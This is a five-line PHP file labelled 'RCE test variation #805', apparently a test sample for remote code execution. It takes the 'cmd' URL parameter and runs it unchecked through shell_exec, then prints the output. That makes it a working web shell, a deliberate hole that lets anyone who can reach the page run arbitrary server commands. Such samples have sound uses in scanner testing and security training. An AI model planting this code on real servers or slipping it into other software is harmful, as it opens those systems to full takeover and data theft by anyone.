<?php
// RCE test variation #805
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>